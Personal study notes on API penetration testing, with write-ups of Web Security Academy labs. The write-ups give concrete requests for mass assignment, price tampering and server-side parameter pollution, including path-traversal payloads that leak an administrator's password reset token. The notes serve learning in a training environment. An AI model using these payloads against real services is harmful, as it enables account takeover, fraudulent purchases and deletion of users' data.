
API -Application Programming Interface

OpenAPI is the new swagger - https://swagger.io/specification/

### HTTP Methods

#### GET - Retrieve data

example request to api:
```http
GET /api/books HTTP/1.1
Host: example.com
```
#### PATCH - apply change

#### OPTIONS - What request methods can be used

`OPTIONS /api/user/wiener HTTP/2`

```http
HTTP/2 405 Method Not Allowed
Allow: GET, DELETE, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```
Even though the OPTIONS method is not allowed we get the Allow: GET, DELETE, PATCH

#### Try different methods on the same path

Example:
- `GET /api/tasks` - Retrieves a list of tasks
- `POST /api/tasks` - Creates a new task
- `DELETE /api/tasks/1` - Deletes a task

Burp intruder has a word-list with `HTTP verbs` to cycle through

### Gather information

- Identify endpoints
- required and optional parameters
- request types
- authentication mechanisms
- rate limits
#### Steps
- Check for available documentation, both for human and machine (json/xml) - Read it! ;)
- Request docs from the API
  run a dir-fuzzer on the site
  and/or manually check:
  - `/api`
  - `/swagger/index.html`
  - `/openapi.json`
- When we find an endpont, investigate the base. For `/api/swagger/v1/users/123` check `/api/swagger/v1`, `/api/swagger` and`/api`. 
- Look for API endpoints by reading .js source files (LinkFinder)
- Identifies hidden, unlinked parameters - Param Miner or fuzzing (Param Miner)


### Mass assignment / Auto-binding (auto assignment)

Software sometimes bind request parameters to fields of an internal object by mistake. Parameters will then be available to us that were meant to be hidden by the developer.

Example: We can see a request to `PATCH /api/users/` with json data like:
```json
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

and we see a request to `GET /api/users/123` returning the json:
```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": false
}
```

we might be able to also update the values for is and isAdmin by just adding them to the `PATCH /api/users/` request.

**Test** this by sending first an "correct" json line `{"isAdmin": false}` and then `{"isAdmin": "foo"}` to be able to compare the responses. If they differ we probably succeeded.

### Server-side parameter pollution (HTTP parameter pollution)

When we send a request to a web server that uses an internal API, we might be able to change the API call by messing with how the parameters are written.  We can encode characters like `#` (`%23`), `&` (`%26`), and `=`.

OBS! These examples show GET requests but this is as applicable to POST too. When looking at requests in Burp HTTP history, don't just look at the obvious `GET` ones with URLs like `/product?productId=1` but also POST ones as they usually have `Params`.

##### Base case - no modifications
Our request - `GET /userSearch?name=peter&back=/home`
Sent to internal API -  `GET /users/search?name=peter&publicProfile=true`

##### Truncating query strings - Inserting an encoded # + a string (to give an error if the # is just removed)
Our request - `GET /userSearch?name=peter%23foo&back=/home`
Sent to internal API -  `GET /users/search?name=peter#foo&publicProfile=true`

##### Injecting invalid parameters - will we get an error? test more
Our request - `GET /userSearch?name=peter%26foo=xyz&back=/home`
Sent to internal API -  `GET /users/search?name=peter&foo=xyz&publicProfile=true`

##### Injecting valid parameters (found by for example Param Miner, or fuzz with intruder or other tool, just make sure to see the response)
Our request - `GET /userSearch?name=peter%26email=foo&back=/home`
Sent to internal API - `GET /users/search?name=peter&email=foo&publicProfile=true`

##### Overriding existing parameters - double same name
Our request - `GET /userSearch?name=peter%26name=carlos&back=/home`
Sent to internal API - `GET /users/search?name=peter&name=carlos&publicProfile=true`

###### How double parameters are interpreted
- PHP - last parameter only
- ASP.NET - combines both (`peter,carlos`), might error
- Node.js / express - first parameter only

#### Server-side parameter pollution in REST paths

As parameters in RESP APIs are different, we'll have to use other ways to modify them.

Example: `/api/users/123` where `/api` is the root API endpoint, `/users` represents a resource and `/123`represents a parameter.


Our request - `GET /edit_profile.php?name=peter`
Sent to internal REST API - `GET /api/private/users/peter`

We might manipulate these with path traversal like `/../`

Our request - `GET /edit_profile.php?name=peter%2f..%2fadmin`
Sent to internal REST API - `GET /api/private/users/peter/../admin`

Example 5 is a great example of this!

#### Server-side parameter pollution in structured data formats

###### JSON Example - Base Request (no modifications)

Our request:
```http
POST /myaccount
name=peter
```
Sent to internal API:
```http
PATCH /users/7312/update
{"name":"peter"}
```

###### JSON Example - Adding a parameter

Our request:
```http
POST /myaccount
name=peter","access_level":"administrator
```
Sent to internal API:
```http
PATCH /users/7312/update
{name="peter","access_level":"administrator"}
```

Request alternative, adding \\:
```http
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```


### Examples from Web Academy Labs
##### Example 1
Task: Delete carlos
We logged in using the supplied creds and found the api through updating the e-mail: `PATCH /api/user/wiener HTTP/2`

| GET /api/user/wiener HTTP/2    | {"username":"wiener","email":"wiener@normal-user.net"}    |
| ------------------------------ | --------------------------------------------------------- |
| GET /api/user HTTP/2           | {"error":"Malformed URL: expecting an identifier"}        |
| GET /api/user/carlos HTTP/2    | {"username":"carlos","email":"carlos@carlos-montoya.net"} |
| DELETE /api/user/carlos HTTP/2 | {"status":"User deleted"}                                 |
##### Example 2
Task: Buy a jacket with nothing
We logged in, put in out cart and tried to buy, failed: no moneys. Found api point: `/api/products/1/price` was used

| OPTIONS /api/products/1/price HTTP/2                                             | HTTP/2 405 Method Not Allowed<br>Allow: GET, PATCH                                                     |
| -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| patch /api/products/1/price HTTP/2                                               | {"type":"ClientError","code":400,<br>"error":"Only 'application/json' Content-Type is supported"}      |
| Content-Type: application/json;charset=UTF-8<br>Content-Length: 7<br><br>{"":""} | {"type":"ClientError","code":400,<br>"error":"'price' parameter missing in body"}                      |
| {"price":"$0.00"}                                                                | {"type":"ClientError","code":400,<br>"error":"'price' parameter must be a valid non-negative integer"} |
| {"price":0}                                                                      | {"price":"$0.00"}                                                                                      |
Then we go to add a new item to the cart and `Place order`.
*The Content-Type converter was used to set content type to json.*

##### Example 3 - Mass assignment vuln
Task: Buy a jacket with nothing
We logged in, added the jacket to out basket and clicked Place order. Then we went over to burp:

| GET /api/checkout HTTP/2 | {"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]} |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
We right clicked the request and selected Change Request Method.
Then we used Content-Type-Converter and right click menu, `Extensions`, `Content Type Converter`, `Convert to JSON`. We pasted the json from the responce and changed the percentage to 100.

Sending the request Solved the task.

##### Example 4 - Server side parameter pollution in a query string
Task: To solve the lab, log in as the `administrator` and delete `carlos`.

Looking at the web page we really just have the login page with a reset password. When we try resetting the password for the user administrator, we get into that a mail was sent. This does nothing for other usernames.

In burp http history we see the POST but also a js-file `/static/js/forgotPassword.js`. In this file we have this line:
```js
window.location.href = `/forgot-password?reset_token=${resetToken}`;
```

POSTs to `POST /forgot-password HTTP/2`:

| csrf=qBRXObH56bj8nLhRCyWv9N2btOzU3lbZ&<br>username=administrator                        | {"type":"email",<br>"result":"*****@normal-user.net"}                  |
| --------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| csrf=qBRXObH56bj8nLhRCyWv9N2btOzU3lbZ&<br>username=administrator%26test=123             | {"error": "Parameter is not supported."}                               |
| csrf=qBRXObH56bj8nLhRCyWv9N2btOzU3lbZ&<br>username=administrator%23                     | {"error": "Field not specified."}                                      |
| csrf=qBRXObH56bj8nLhRCyWv9N2btOzU3lbZ&<br>username=administrator%26field=username%23    | {"result":"administrator",<br>type":"username"}                        |
| csrf=qBRXObH56bj8nLhRCyWv9N2btOzU3lbZ&<br>username=administrator%26field=email%23       | {"result":"*****@normal-user.net",<br>"type":"email"}                  |
| csrf=qBRXObH56bj8nLhRCyWv9N2btOzU3lbZ&<br>username=administrator%26field=reset_token%23 | {"result":"vyto639dj7g7fls5lx8r01nkldhdcugr",<br>"type":"reset_token"} |

We got it to send us the reset_token!

I could not use this with a post but had to send a get request as in the js code:
`GET /forgot-password?reset_token=vyto639dj7g7fls5lx8r01nkldhdcugr HTTP/2`

This request gives us a form to fill in a new pessword, so we `Show response in browser`.
![[Images/Pasted image 20250605193408.png]]
We log in as Administrator with the new password
![[Images/Pasted image 20250605193521.png]]
Go to Admin Panel and delete the user Carlos

##### Example 5 - Exploiting server-side parameter pollution in a REST URL
Task: To solve the lab, log in as the `administrator` and delete `carlos`.

Similarly to the last one, we go to reset password for administrator.

`POST /forgot-password HTTP/2`:

| csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&<br>username=administrator                        | {"type":"email",<br>"result":"*****@normal-user.net"}                                                                                                                                                                                                    |
| --------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&<br>username=/administrator/../carlos             | {"type":"email",<br>"result":"******@carlos-montoya.net"}                                                                                                                                                                                                |
| csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&<br>username=/administrator/../carlos../../qwerty | {"type": "error",<br>"result": "The provided username \\"qwerty\\" does not exist"}                                                                                                                                                                      |
| csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&<br>username=/../../../../%23                     | `{"error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"}` |
This message means we're now outside the API root.

`csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&username=/../../../../openapi.json%23`
```json
{
  "error": "Unexpected response from API server:
{
  "openapi": "3.0.0",
  "info": {
    "title": "User API",
    "version": "2.0.0"
  },
  "paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
      "get": {
        "tags": [
          "users"
        ],
        "summary": "Find user by username",
        "description": "API Version 1",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "description": "Username",
            "required": true,
            "schema": {
        ..."
}
```
"/api/internal/v1/users/{username}/field/{field}" sounds very interesting
Let's see if we can get the same info this way

| csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&<br>username=administrator                                                   | {"type":"email",<br>"result":"*****@normal-user.net"} |
| ------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------- |
| csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&<br>username=/../../../../api/internal/v1/users/administrator/field/email%23 | {"type":"email",<br>"result":"*****@normal-user.net"} |

In the .js code we see a reference to:
```js
window.location.href = `/forgot-password?passwordResetToken=${resetToken}`; 
```

| csrf=u2xRho6ZPBvjZDTwmefDjO4x4qapzOEn&<br>username=/../../../../api/internal/v1/users/<br>administrator/field/passwordResetToken%23 | {<br>  "type": "passwordResetToken",<br>  "result": "px8cxuq1t40170j7er598xzm3qu8kllb"<br>} |
| ----------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
We send this link in the browser
https://0a5a003a044cf8188345ce8b004f001f.web-security-academy.net/forgot-password?passwordResetToken=px8cxuq1t40170j7er598xzm3qu8kllb

When testing we also found that we bypassed a security feature by mistake, using the long path:

| csrf=QyFI9GXlohsPAMbBZVaAmSZ9qJLoLrKX&<br>username=administrator/field/passwordResetToken%23                     | {<br>  "type": "error",<br>  "result": "This version of API only supports the email field for security reasons"<br>} |
| ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| csrf=QyFI9GXlohsPAMbBZVaAmSZ9qJLoLrKX&<br>username=/../../v1/users/administrator/field/<br>passwordResetToken%23 | {<br>  "type": "passwordResetToken",<br>  "result": "uaulb168ydgltefscr8b42dyhc9uretm"<br>}                          |
This was the minimal depth to get the passwordResetToken



### Useful extensions

##### OpenAPI Parser
For APIs in JSON or YAML format
##### Content-Type Converter
Converts XML, JSON, GET Request Parameters and Body Parameters to JSON or XML...
##### Param Miner
Identifies hidden, unlinked parameters.
Useful for finding web cache poisoning vulnerabilities.
![[Images/Pasted image 20250603213306.png]]
### Useful tools

##### Postman
https://www.postman.com/

##### SoapUI
https://www.soapui.org/

##### LinkFinder
Finds API links in js code (didn't work well in out test)
https://github.com/GerbenJavado/LinkFinder


